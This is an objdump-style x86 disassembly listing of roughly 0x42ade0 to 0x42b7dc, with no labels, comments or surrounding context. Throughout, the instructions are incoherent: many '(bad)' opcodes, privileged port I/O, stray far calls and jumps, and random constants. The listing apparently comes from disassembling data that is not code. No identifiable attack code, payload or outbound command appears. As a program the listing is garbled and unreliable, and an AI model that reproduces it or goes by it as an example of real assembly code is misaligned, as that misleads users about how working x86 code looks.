  42ade0:	sub    eax,0xe0db69cf
  42ade5:	mov    WORD PTR [edx+0x10],es
  42ade8:	call   0xc576:0x887107bd
  42adef:	jmp    0x42add2
  42adf1:	repnz mov bh,BYTE PTR [edx-0x4e]
  42adf5:	jo     0x42ae5c
  42adf7:	xor    esp,eax
  42adf9:	test   al,0x56
  42adfb:	add    ebx,DWORD PTR [eax+0x15]
  42adfe:	inc    edi
  42adff:	arpl   dx,ax
  42ae01:	push   esi
  42ae02:	out    0xc8,eax
  42ae04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae05:	fisubr WORD PTR [ebx+esi*2-0x57]
  42ae09:	test   BYTE PTR [esi-0x186e5f14],ah
  42ae0f:	icebp  
  42ae10:	out    0x0,al
	...
  42ae72:	add    BYTE PTR [eax],al
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	jge    0x42ae94
  42ae82:	std    
  42ae83:	mov    bh,0xa5
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0xe2000001
  42ae8d:	int3   
  42ae8e:	sbb    ebp,ebx
  42ae90:	gs out dx,eax
  42ae92:	out    0x30,al
  42ae94:	(bad)
  42ae99:	bound  ebp,QWORD PTR [ecx-0x69]
  42ae9c:	not    BYTE PTR [edx]
  42ae9e:	fmul   QWORD PTR [ecx-0x5c]
  42aea1:	or     ecx,DWORD PTR [ebp-0x3d]
  42aea4:	push   edi
  42aea5:	fcmovnu st,st(4)
  42aea7:	adc    ebx,edx
  42aea9:	adc    BYTE PTR [esi-0x7983606b],0x60
  42aeb0:	call   DWORD PTR [edi-0x10421b24]
  42aeb6:	xchg   esi,eax
  42aeb7:	inc    edi
  42aeb8:	sbb    al,0x81
  42aeba:	test   DWORD PTR [esi],0x77fe4885
  42aec0:	aam    0x87
  42aec2:	das    
  42aec3:	ins    DWORD PTR es:[edi],dx
  42aec4:	aas    
  42aec5:	retf   
  42aec6:	imul   ebp,DWORD PTR [eax],0x5f9dd508
  42aecc:	push   ecx
  42aecd:	into   
  42aece:	push   cs
  42aecf:	clc    
  42aed0:	mov    WORD PTR [ebp+0x6d],fs
  42aed3:	les    esi,FWORD PTR [ecx]
  42aed5:	sub    al,0x5b
  42aed7:	aam    0xe9
  42aed9:	mov    esp,0x259ddd59
  42aede:	xchg   edi,eax
  42aedf:	imul   esp,DWORD PTR [esi],0xfffffff2
  42aee2:	jle    0x42ae98
  42aee4:	pop    ecx
  42aee5:	push   es
  42aee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aee7:	out    dx,eax
  42aee8:	xor    BYTE PTR [ecx-0x6],al
  42aeeb:	jl     0x42aee7
  42aeed:	addr16 aad 0x9b
  42aef0:	lds    eax,FWORD PTR [ecx-0x90a1c56]
  42aef6:	sbb    BYTE PTR [edx-0x66],dh
  42aef9:	outs   dx,BYTE PTR ds:[esi]
  42aefa:	aad    0x38
  42aefc:	mov    esi,0x57e1f2e
  42af01:	jbe    0x42af6d
  42af03:	dec    ebp
  42af04:	ficom  DWORD PTR [edi]
  42af06:	mov    ebp,0x265272f
  42af0b:	fadd   st,st(7)
  42af0d:	fild   WORD PTR [edi]
  42af0f:	lock into 
  42af11:	cmp    BYTE PTR ds:0xff8acbba,ch
  42af17:	mov    ds:0xdb60dab9,eax
  42af1c:	and    al,BYTE PTR [esi]
  42af1e:	mov    al,ds:0x6514aeaf
  42af23:	cmp    ecx,DWORD PTR [edx+edx*2-0x2b2df97]
  42af2a:	sub    eax,esi
  42af2c:	test   BYTE PTR [ecx+0xe],0x42
  42af30:	push   ecx
  42af31:	std    
  42af32:	neg    DWORD PTR [edx-0x52ea9f11]
  42af38:	ret    
  42af39:	retf   
  42af3a:	imul   ebp,DWORD PTR [ebx+0x721018a4],0x67b5d6a1
  42af44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af45:	dec    ebx
  42af46:	xor    ch,0xd0
  42af49:	cwde   
  42af4a:	sahf   
  42af4b:	push   cs
  42af4c:	xor    al,0xef
  42af4e:	enter  0xc8ed,0xa8
  42af52:	leave  
  42af53:	shr    BYTE PTR [ebp-0x3a],1
  42af56:	ret    
  42af57:	nop
  42af58:	outs   dx,DWORD PTR ds:[esi]
  42af59:	jo     0x42af92
  42af5b:	mov    dh,0xf6
  42af5d:	je     0x42afb3
  42af5f:	xchg   esi,eax
  42af60:	push   eax
  42af61:	mov    bh,0xd1
  42af63:	call   0x361c:0xf67c0483
  42af6a:	dec    esi
  42af6b:	test   eax,0xf77a8505
  42af70:	sbb    ebx,DWORD PTR [edi+0x8]
  42af73:	xchg   ecx,eax
  42af74:	fidiv  DWORD PTR [eax+ebx*2+0x30884d73]
  42af7b:	push   0xf36766e7
  42af80:	fnstenv [ecx-0x71]
  42af83:	adc    eax,0xaa2672d8
  42af88:	sar    BYTE PTR [ecx],cl
  42af8a:	inc    eax
  42af8b:	in     eax,dx
  42af8c:	push   ecx
  42af8d:	mov    cl,0x1b
  42af8f:	pop    ss
  42af90:	ret    0x0
	...
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	jno    0x42b078
  42b002:	dec    esi
  42b003:	xlat   BYTE PTR ds:[ebx]
  42b004:	stos   BYTE PTR es:[edi],al
  42b005:	int3   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    eax,0x10000001
  42b00d:	sti    
  42b00e:	mov    bl,BYTE PTR [eax+edi*4+0x27379b8a]
  42b015:	ss cmp al,0xa
  42b018:	call   0x27c6cbcd
  42b01d:	inc    edi
  42b01e:	(bad)  
  42b01f:	jp     0x42afa4
  42b021:	rcr    BYTE PTR [eax-0x6c],0x11
  42b025:	loopne 0x42afc7
  42b027:	pushf  
  42b028:	dec    edx
  42b029:	sbb    dh,dl
  42b02b:	xor    eax,0x3e658903
  42b030:	push   esi
  42b031:	cmp    ebx,DWORD PTR [edi+0x48]
  42b034:	out    0xa,al
  42b036:	pop    es
  42b037:	push   0x4d
  42b039:	imul   edi,DWORD PTR [esi+0x1c],0x1117db66
  42b040:	jne    0x42afd8
  42b042:	jle    0x42afd0
  42b044:	pop    edx
  42b045:	inc    esp
  42b046:	or     DWORD PTR [esi+0x23],ebp
  42b049:	xchg   esp,eax
  42b04a:	scas   al,BYTE PTR es:[edi]
  42b04b:	cmp    BYTE PTR [eax+0x2ba1294c],dh
  42b051:	neg    ch
  42b053:	xchg   esp,eax
  42b054:	cmp    DWORD PTR ds:0xfa657c3e,edi
  42b05a:	pop    ebx
  42b05b:	sbb    ebp,ebp
  42b05d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b05e:	sub    cl,al
  42b060:	xor    al,0x3f
  42b062:	(bad)  [edx+0x61749843]
  42b068:	in     eax,dx
  42b069:	push   eax
  42b06a:	mov    bh,0xa3
  42b06c:	sbb    ebx,DWORD PTR [ecx+0x5531c02f]
  42b072:	dec    eax
  42b073:	cwde   
  42b074:	jmp    0x42b05b
  42b076:	xchg   esp,eax
  42b077:	fwait
  42b078:	pop    es
  42b079:	int3   
  42b07a:	pop    es
  42b07b:	ror    esp,0x74
  42b07e:	push   ebp
  42b07f:	pop    esp
  42b080:	and    DWORD PTR [eax-0x15991056],esp
  42b086:	xor    eax,0xc15ce063
  42b08b:	and    DWORD PTR [ebx-0x40],ecx
  42b08e:	imul   ebx,ebp,0xfffffff4
  42b091:	sub    BYTE PTR [eax+0x78],ah
  42b094:	out    dx,eax
  42b095:	push   edi
  42b096:	xchg   ebx,eax
  42b097:	push   cs
  42b098:	sub    al,0x7f
  42b09a:	mov    edx,0x98f11e65
  42b09f:	das    
  42b0a0:	sbb    DWORD PTR [ebx+0x4b],0x2a
  42b0a4:	das    
  42b0a5:	lock mov ds:0x1c56f82,eax
  42b0ab:	add    bl,BYTE PTR [esi-0x4b]
  42b0ae:	add    BYTE PTR [eax+esi*1],bh
  42b0b1:	loopne 0x42b078
  42b0b3:	push   cs
  42b0b4:	add    eax,0x9248e0fe
  42b0b9:	(bad)  
  42b0ba:	xchg   esi,eax
  42b0bb:	lds    ebp,FWORD PTR [edi]
  42b0bd:	js     0x42b0a8
  42b0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0c0:	pop    esi
  42b0c1:	mov    edx,0x4d96843c
  42b0c6:	or     dh,BYTE PTR [eax+0x67c98781]
  42b0cc:	mov    ebp,es
  42b0ce:	sub    bh,0x50
  42b0d1:	test   BYTE PTR [ecx-0x64],0x54
  42b0d5:	mov    dh,0x4
  42b0d7:	xchg   ecx,eax
  42b0d8:	out    0xa7,eax
  42b0da:	xor    BYTE PTR [edx],dl
  42b0dc:	fbstp  TBYTE PTR [edx]
  42b0de:	dec    ebx
  42b0df:	mov    ds:0x8836f256,eax
  42b0e4:	pop    es
  42b0e5:	pop    ds
  42b0e6:	fs scas al,BYTE PTR es:[edi]
  42b0e8:	xor    cl,BYTE PTR [ebx-0x6b]
  42b0eb:	mov    eax,0x7a1548d1
  42b0f0:	leave  
  42b0f1:	popf   
  42b0f2:	cmp    al,0x59
  42b0f4:	outs   dx,DWORD PTR ds:[esi]
  42b0f5:	out    0x5e,eax
  42b0f7:	in     al,0xec
  42b0f9:	out    dx,eax
  42b0fa:	sub    bl,cl
  42b0fc:	jmp    0x89d81f95
  42b101:	or     cl,BYTE PTR [eax-0x12]
  42b104:	jb     0x42b170
  42b106:	outs   dx,DWORD PTR ds:[esi]
  42b107:	add    ah,BYTE PTR [esi]
  42b109:	mov    dh,0x5c
  42b10b:	test   BYTE PTR [ebp-0x3d],0xfa
  42b10f:	movlps xmm0,QWORD PTR [eax]
	...
  42b172:	add    BYTE PTR [eax],al
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	inc    esi
  42b181:	iret   
  42b182:	ffree  st(6)
  42b184:	scas   eax,DWORD PTR es:[edi]
  42b185:	int    0x1
  42b187:	add    BYTE PTR ds:0xd000001,al
  42b18d:	xchg   ecx,eax
  42b18e:	xor    edx,DWORD PTR [edi+edx*2+0x7a]
  42b192:	cmp    al,0x47
  42b194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b195:	pop    esi
  42b197:	push   ss
  42b198:	xchg   ebp,eax
  42b199:	ret    0x2163
  42b19c:	mov    eax,0x8dfebd57
  42b1a1:	sbb    ch,dl
  42b1a3:	addr16 dec esp
  42b1a5:	jo     0x42b135
  42b1a7:	mov    edi,0xd8f4b6e6
  42b1ac:	mov    ds:0x18123351,al
  42b1b1:	or     al,0x80
  42b1b3:	inc    ebp
  42b1b4:	mov    cl,0x4
  42b1b6:	repnz adc bl,ch
  42b1b9:	xchg   edx,eax
  42b1ba:	mov    WORD PTR [ebx+0x3cd3f9a1],?
  42b1c0:	sub    eax,0x76865dca
  42b1c5:	mov    al,ds:0x84bcd626
  42b1ca:	sub    DWORD PTR [eax+eiz*4],ecx
  42b1cd:	repnz dec ecx
  42b1cf:	inc    edi
  42b1d0:	lahf   
  42b1d1:	inc    ebp
  42b1d2:	dec    esi
  42b1d3:	or     ecx,esp
  42b1d5:	pop    es
  42b1d6:	mov    ecx,0xc07312e1
  42b1db:	dec    eax
  42b1dc:	lods   eax,DWORD PTR ds:[esi]
  42b1dd:	pushf  
  42b1de:	out    0xe5,eax
  42b1e0:	pop    edx
  42b1e1:	sbb    eax,0xbf78724e
  42b1e6:	sub    eax,0xd8c9585f
  42b1eb:	pop    esp
  42b1ec:	dec    BYTE PTR [edi+0x70]
  42b1ef:	jmp    0xcea5:0xdcb17ce2
  42b1f6:	jmp    0x42b1f5
  42b1f8:	mov    edi,0xfe4c215e
  42b1fd:	retf   0x11ab
  42b200:	cmp    edi,DWORD PTR ds:0xbe1d93b6
  42b206:	pop    ds
  42b207:	cmp    eax,DWORD PTR [edi]
  42b209:	out    0xd,al
  42b20b:	and    esi,ecx
  42b20d:	inc    edx
  42b20e:	mov    bh,0xd7
  42b210:	(bad)  
  42b211:	jle    0x42b276
  42b213:	xchg   esp,eax
  42b214:	mov    cs,edx
  42b216:	or     al,0x43
  42b218:	cmp    al,0xfd
  42b21a:	mov    edx,0x1f82b8cf
  42b21f:	js     0x42b257
  42b221:	jmp    FWORD PTR [eax-0x1a]
  42b224:	xchg   edi,eax
  42b225:	xchg   edi,eax
  42b226:	aas    
  42b227:	hlt    
  42b228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b229:	jb     0x42b29b
  42b22b:	pop    ecx
  42b22c:	shr    BYTE PTR [edx],1
  42b22e:	push   es
  42b22f:	push   eax
  42b230:	retf   
  42b231:	xchg   edi,eax
  42b232:	inc    ebp
  42b233:	dec    BYTE PTR [esi+0xf]
  42b236:	icebp  
  42b237:	dec    ebp
  42b238:	jg     0x42b289
  42b23a:	scas   al,BYTE PTR es:[edi]
  42b23b:	adc    BYTE PTR [ebp+0x13],al
  42b23e:	nop
  42b23f:	and    eax,0xf069a73b
  42b244:	sbb    DWORD PTR [esi],esp
  42b246:	fistp  DWORD PTR [ebp+0x1ad527b2]
  42b24c:	xchg   ebp,eax
  42b24d:	jecxz  0x42b2a5
  42b24f:	lds    esi,FWORD PTR [edi]
  42b251:	jae    0x42b253
  42b253:	pop    esi
  42b254:	vdivsd xmm2,xmm3,QWORD PTR [esi-0x1]
  42b259:	pop    ebp
  42b25a:	mov    al,ds:0x9bb921c4
  42b25f:	sti    
  42b260:	pop    eax
  42b261:	addr16 sbb ah,dh
  42b264:	push   esp
  42b265:	adc    DWORD PTR cs:[edi-0x72],edi
  42b269:	adc    DWORD PTR [esi+0x78],edi
  42b26c:	cmp    al,0xb5
  42b26e:	in     eax,0x2f
  42b270:	(bad)  
  42b272:	adc    eax,0x91fc09ae
  42b277:	stc    
  42b278:	cwde   
  42b279:	pop    ebp
  42b27a:	and    edi,DWORD PTR [ebp+0x632908f7]
  42b280:	ja     0x42b221
  42b282:	mov    eax,0x9e8adba3
  42b287:	mov    cl,0x50
  42b289:	mov    ds:0xdba1e9ed,al
  42b28e:	sbb    al,0x70
  42b290:	pop    DWORD PTR [eax]
	...
  42b2f2:	add    BYTE PTR [eax],al
  42b2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b2f5:	mov    ds,WORD PTR [ecx-0x28844a0]
  42b2fb:	iret   
  42b2fc:	sub    eax,0x738e65
  42b301:	outs   dx,DWORD PTR ds:[esi]
  42b302:	mov    eax,0x1ceb44f
  42b307:	add    BYTE PTR ds:0x37000001,al
  42b30d:	sbb    BYTE PTR [ebp+ecx*1-0x29eeb7b2],dh
  42b314:	stc    
  42b315:	ds jecxz 0x42b348
  42b318:	lds    edx,FWORD PTR [edi-0x54de25af]
  42b31e:	scas   eax,DWORD PTR es:[edi]
  42b31f:	or     eax,0xd122b2a8
  42b324:	loop   0x42b2b4
  42b326:	pop    esi
  42b327:	out    dx,eax
  42b328:	nop
  42b329:	cdq    
  42b32a:	pop    esp
  42b32b:	mov    DWORD PTR [ecx-0x21a34a5b],eax
  42b331:	pop    esp
  42b332:	retf   0x14c5
  42b335:	inc    esi
  42b336:	and    BYTE PTR ss:[esi+0x32555cb6],0xa9
  42b33e:	xor    eax,0xb9fff27f
  42b343:	out    dx,al
  42b344:	xchg   esi,eax
  42b345:	cmp    DWORD PTR [edx+edx*8],eax
  42b348:	jae    0x42b2cd
  42b34a:	outs   dx,BYTE PTR ds:[esi]
  42b34b:	jne    0x42b353
  42b34d:	adc    DWORD PTR [ecx+0x73],esi
  42b350:	jo     0x42b351
  42b352:	xor    ch,BYTE PTR [edi+0x449500ed]
  42b358:	jle    0x42b34d
  42b35a:	hlt    
  42b35b:	loopne 0x42b3d2
  42b35d:	xchg   ebx,eax
  42b35e:	daa    
  42b35f:	xchg   esi,eax
  42b361:	repnz inc ecx
  42b363:	mov    ecx,0xd80fef5
  42b368:	cmp    bl,BYTE PTR [edx]
  42b36a:	and    esp,DWORD PTR [ecx+0x3bc7eb98]
  42b370:	dec    ebx
  42b371:	sub    al,0xf2
  42b373:	aam    0xad
  42b375:	or     bh,BYTE PTR [edx+ebp*8-0x37]
  42b379:	inc    edx
  42b37a:	(bad)  
  42b37b:	jns    0x42b3a7
  42b37d:	xchg   edx,eax
  42b37e:	es aad 0xfa
  42b381:	repnz les esi,FWORD PTR [ebx]
  42b384:	int    0xb
  42b386:	xchg   edi,eax
  42b387:	daa    
  42b388:	jno    0x42b38d
  42b38a:	jmp    0x8c4ca9af
  42b38f:	lea    edi,[esp+ecx*2-0x1e89ebc6]
  42b396:	xchg   ebp,eax
  42b397:	sbb    DWORD PTR [eax-0x5b2541d],0xffffffd6
  42b39e:	mov    BYTE PTR [ecx],0xb5
  42b3a1:	cmp    BYTE PTR [edx-0x13],bl
  42b3a4:	xchg   esp,eax
  42b3a5:	xor    DWORD PTR [esi+ecx*2+0x6ca0abfb],ebx
  42b3ac:	mov    WORD PTR [ecx+0x8],cs
  42b3af:	jp     0x42b33d
  42b3b1:	pop    ss
  42b3b2:	pusha  
  42b3b3:	fisubr WORD PTR [edi+0x429efebe]
  42b3b9:	lods   eax,DWORD PTR ds:[esi]
  42b3ba:	add    al,BYTE PTR [esi+0x21e02b8a]
  42b3c0:	inc    esi
  42b3c1:	das    
  42b3c2:	pop    esi
  42b3c3:	xor    BYTE PTR [edi+0x44f352f1],0xb5
  42b3ca:	push   edi
  42b3cb:	je     0x42b3f6
  42b3cd:	inc    esp
  42b3ce:	dec    eax
  42b3cf:	enter  0x575c,0x32
  42b3d3:	push   es
  42b3d4:	stos   BYTE PTR es:[edi],al
  42b3d5:	dec    edx
  42b3d6:	mov    DWORD PTR [edx+0x25],edx
  42b3d9:	push   es
  42b3da:	jne    0x42b439
  42b3dc:	jnp    0x42b3d6
  42b3de:	mov    ebp,0x4ebefb65
  42b3e3:	cmp    ch,cl
  42b3e5:	push   ebp
  42b3e6:	rcl    esi,0x36
  42b3e9:	adc    al,0x6b
  42b3eb:	pusha  
  42b3ec:	sbb    BYTE PTR [edi-0x49742f78],ah
  42b3f2:	mov    dl,0xe2
  42b3f4:	pop    es
  42b3f5:	xchg   edi,ebp
  42b3f7:	add    eax,DWORD PTR [esi-0x26]
  42b3fa:	(bad)  
  42b3fb:	mov    ah,0x46
  42b3fd:	and    al,0x5
  42b3ff:	loope  0x42b440
  42b401:	xor    ah,al
  42b403:	jnp    0x42b3e6
  42b405:	add    ah,BYTE PTR [edi-0x28]
  42b408:	push   esp
  42b409:	pop    es
  42b40a:	imul   DWORD PTR [ecx]
  42b40c:	and    al,0xef
  42b40e:	inc    eax
  42b40f:	fld    DWORD PTR [ebp+0x0]
	...
  42b472:	add    BYTE PTR [eax],al
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edi+ecx*8-0x30469224],eax
  42b486:	add    DWORD PTR [eax],eax
  42b488:	add    eax,0x74000001
  42b48d:	pop    ebx
  42b48e:	das    
  42b48f:	add    al,0x86
  42b491:	push   ds
  42b492:	dec    ecx
  42b493:	test   DWORD PTR [edi-0x3c],0xc314f4a4
  42b49a:	(bad)  
  42b49c:	fdivr  st,st(0)
  42b49e:	ja     0x42b513
  42b4a0:	daa    
  42b4a1:	xchg   edi,eax
  42b4a2:	rcr    BYTE PTR [edi-0x6ab4a8bb],1
  42b4a8:	iret   
  42b4a9:	cmp    dl,BYTE PTR [ebp-0x1abad210]
  42b4af:	sbb    cl,BYTE PTR [edx]
  42b4b1:	and    al,0x9d
  42b4b3:	sbb    BYTE PTR [ebx],0xbf
  42b4b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4b7:	jbe    0x42b46a
  42b4b9:	call   0x28d96b5b
  42b4be:	xor    eax,DWORD PTR [ebx+eax*4]
  42b4c1:	fcomip st,st(2)
  42b4c3:	sub    eax,DWORD PTR [edi+0x3]
  42b4c6:	xchg   edi,eax
  42b4c7:	stos   DWORD PTR es:[edi],eax
  42b4c8:	mov    DWORD PTR [esp+esi*1-0x19],ebx
  42b4cc:	les    esi,FWORD PTR [ebx-0x25]
  42b4cf:	retf   0x83de
  42b4d2:	or     al,0x94
  42b4d4:	pop    ss
  42b4d5:	xor    eax,0xd10040ee
  42b4da:	push   esi
  42b4db:	push   0x36
  42b4dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4de:	loop   0x42b559
  42b4e0:	adc    edi,edi
  42b4e2:	sbb    DWORD PTR [esi+0x7470e74f],0xb16ee672
  42b4ec:	icebp  
  42b4ed:	(bad)  
  42b4ee:	es lahf 
  42b4f0:	push   edi
  42b4f1:	and    al,0xe7
  42b4f3:	retf   0x66ae
  42b4f6:	popa   
  42b4f7:	outs   dx,BYTE PTR ds:[esi]
  42b4f8:	dec    eax
  42b4f9:	nop
  42b4fa:	fcomi  st,st(3)
  42b4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4fd:	imul   DWORD PTR [esi]
  42b4ff:	in     eax,dx
  42b500:	test   al,0x94
  42b502:	adc    edx,esp
  42b504:	stc    
  42b505:	ret    
  42b506:	mov    ch,ah
  42b508:	dec    edx
  42b509:	cmp    esi,0xffffffae
  42b50c:	pop    ecx
  42b50d:	cmc    
  42b50e:	add    BYTE PTR [esi-0x2c],bl
  42b511:	popf   
  42b512:	mov    dh,0xb6
  42b514:	xor    BYTE PTR [edi+0x7e],ch
  42b517:	mov    WORD PTR [ebx+0x62],?
  42b51a:	inc    eax
  42b51b:	and    DWORD PTR [edi+0xd952d08],0xfe4151f
  42b525:	mov    ecx,0x9c6becee
  42b52a:	je     0x42b57b
  42b52c:	imul   ebx,DWORD PTR [edx],0xd0c1816e
  42b532:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b533:	jo     0x42b524
  42b535:	out    0x6,al
  42b537:	pusha  
  42b538:	add    cl,BYTE PTR [ebx]
  42b53a:	or     ah,BYTE PTR [edx+edi*1]
  42b53d:	mov    eax,0x2501da5
  42b542:	mov    esp,0x36cb6b74
  42b547:	jecxz  0x42b4e9
  42b549:	outs   dx,BYTE PTR ds:[esi]
  42b54a:	or     dh,BYTE PTR [ebx+0x59]
  42b54d:	in     al,dx
  42b54e:	pinsrw mm1,WORD PTR [ecx+ecx*1],0xdf
  42b553:	inc    edx
  42b554:	cdq    
  42b555:	push   ebx
  42b556:	push   ss
  42b557:	jmp    0x783b5929
  42b55c:	jecxz  0x42b514
  42b55e:	push   esp
  42b55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b560:	shr    BYTE PTR [ebx+eiz*8+0x1ac3bfc3],cl
  42b567:	mov    ah,0xd3
  42b569:	enter  0x96e6,0xf8
  42b56d:	adc    ah,dl
  42b56f:	bswap  esi
  42b571:	bound  ecx,QWORD PTR [edx+eiz*2]
  42b574:	cmp    eax,0xe3a714f0
  42b579:	test   al,0xd8
  42b57b:	adc    al,0x51
  42b57d:	xor    DWORD PTR [ecx],eax
  42b57f:	ins    DWORD PTR es:[edi],dx
  42b580:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b581:	call   0x9ac:0xd8de22dd
  42b588:	inc    ecx
  42b589:	mov    ebp,0xbcf5aa48
  42b58e:	cs daa 
  42b590:	and    DWORD PTR [eax],eax
	...
  42b5f2:	add    BYTE PTR [eax],al
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	pop    ss
  42b601:	cdq    
  42b602:	shr    edx,1
  42b604:	mov    esi,0x50001d0
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [edx+0x33],ch
  42b60e:	fiadd  WORD PTR [esi-0x37]
  42b611:	int    0x81
  42b613:	mov    DWORD PTR [eax-0x11625ba7],0x140a3296
  42b61d:	cwde   
  42b61e:	lock pop ecx
  42b620:	jb     0x42b5eb
  42b622:	jbe    0x42b63b
  42b624:	das    
  42b625:	xchg   DWORD PTR [ecx-0x68],edi
  42b628:	inc    esp
  42b629:	clc    
  42b62a:	cs (bad) 
  42b62c:	mov    esi,0x42a639
  42b631:	xlat   BYTE PTR ds:[ebx]
  42b632:	dec    esp
  42b633:	xor    dl,0xa7
  42b636:	push   esp
  42b637:	push   esp
  42b638:	sub    edx,DWORD PTR [esi-0x5d]
  42b63b:	dec    edi
  42b63c:	mov    DWORD PTR ds:0xe8dce36,esp
  42b642:	mov    edx,0x8c175f1b
  42b647:	push   esp
  42b648:	or     dl,BYTE PTR [edx+eax*8-0xd]
  42b64c:	mov    ebp,0xb8333e3b
  42b651:	jmp    0x89270ee3
  42b656:	icebp  
  42b657:	clc    
  42b658:	inc    edi
  42b659:	dec    ebx
  42b65a:	adc    edx,DWORD PTR ds:0x6fefb79
  42b660:	xor    esi,esp
  42b662:	or     dl,BYTE PTR [edi+0x1b]
  42b665:	(bad)  
  42b666:	mov    ebp,0xfd36b449
  42b66b:	in     eax,0x4c
  42b66d:	iret   
  42b66e:	mov    dl,0xb2
  42b670:	loopne 0x42b63c
  42b672:	ffree  st(1)
  42b674:	(bad)  
  42b675:	(bad)  
  42b676:	adc    DWORD PTR [edx-0x66],0xfb2fb1a3
  42b67d:	or     ebx,esi
  42b67f:	pusha  
  42b680:	outs   dx,BYTE PTR es:[esi]
  42b682:	add    cl,ah
  42b684:	or     bh,cl
  42b686:	rcl    DWORD PTR [ebx+edi*2],cl
  42b689:	in     eax,dx
  42b68a:	pushf  
  42b68b:	inc    ebx
  42b68c:	arpl   WORD PTR [edx+edx*2+0x6b4228b1],sp
  42b693:	mov    ebp,0x63ea70c
  42b698:	nop
  42b699:	inc    esi
  42b69a:	sar    edi,cl
  42b69c:	ins    BYTE PTR es:[edi],dx
  42b69d:	push   es
  42b69e:	pushf  
  42b69f:	rcl    BYTE PTR [edx-0x7015d0f2],1
  42b6a5:	jbe    0x42b643
  42b6a7:	retf   0x779b
  42b6aa:	(bad)  
  42b6ab:	pop    eax
  42b6ac:	jecxz  0x42b718
  42b6ae:	enter  0x8e04,0xae
  42b6b2:	xor    DWORD PTR [edi-0x6844fd92],esi
  42b6b8:	add    eax,0xcb415c81
  42b6bd:	cld    
  42b6be:	cmovbe eax,DWORD PTR ds:0xc8ae741
  42b6c5:	or     eax,0xaf986954
  42b6ca:	xchg   DWORD PTR [edi-0x464261e9],edx
  42b6d0:	pop    ebx
  42b6d1:	repz aas 
  42b6d3:	push   ss
  42b6d4:	addr16 mov eax,ds:0x1ad9
  42b6d8:	fisubr DWORD PTR [eax+0x16]
  42b6db:	leave  
  42b6dc:	call   0x832f:0xe49cf8d2
  42b6e3:	(bad)  
  42b6e4:	imul   edx,esi,0xffffffa8
  42b6e7:	bound  ebx,QWORD PTR [edi-0xaee1a2b]
  42b6ed:	repnz fisttp DWORD PTR [ebp+0x1b6c4da5]
  42b6f4:	adc    edi,DWORD PTR [eax]
  42b6f6:	cmp    al,bl
  42b6f8:	add    al,BYTE PTR [ebx]
  42b6fa:	(bad)  
  42b6fb:	enter  0x189f,0x0
  42b6ff:	xchg   edx,eax
  42b700:	cmp    ebp,DWORD PTR [esi-0x44]
  42b703:	adc    al,0x4b
  42b705:	xor    edi,edi
  42b707:	mov    bl,0xe5
  42b709:	cmp    ah,BYTE PTR [eax]
  42b70b:	mov    dl,0xf7
  42b70d:	sahf   
  42b70e:	and    eax,0xbfa1
	...
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	scas   al,BYTE PTR es:[edi]
  42b781:	clc    
  42b782:	outs   dx,BYTE PTR ds:[esi]
  42b783:	jnp    0x42b748
  42b785:	rol    DWORD PTR [ecx],1
  42b787:	add    BYTE PTR ds:0x44000001,al
  42b78d:	mov    esi,0xa3f51cdd
  42b792:	push   ebx
  42b793:	cmp    BYTE PTR [esi+0x143071de],0xe6
  42b79a:	repz xor eax,DWORD PTR [eax-0xe7bb07f]
  42b7a1:	jbe    0x42b73e
  42b7a3:	mov    eax,cs
  42b7a5:	in     eax,0x17
  42b7a7:	test   DWORD PTR [eax+0x10],ebp
  42b7aa:	xchg   ecx,eax
  42b7ab:	or     eax,0x35f99c15
  42b7b0:	inc    edx
  42b7b1:	add    ebx,DWORD PTR [ecx+0x48d83210]
  42b7b7:	xchg   esi,eax
  42b7b8:	add    edi,esi
  42b7ba:	pop    edi
  42b7bb:	fild   DWORD PTR [ebx-0x585a2f4a]
  42b7c1:	(bad)  
  42b7c2:	xor    esi,DWORD PTR [ecx+0x54904de9]
  42b7c8:	out    dx,eax
  42b7c9:	push   ecx
  42b7ca:	push   edi
  42b7cb:	in     eax,dx
  42b7cc:	sar    DWORD PTR [ebx+eax*1+0x78],0x95
  42b7d1:	cmp    esi,ebp
  42b7d3:	ds aaa 
  42b7d5:	fcomip st,st(4)
  42b7d7:	fild   WORD PTR [esi-0x2c]
  42b7da:	(bad)  
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
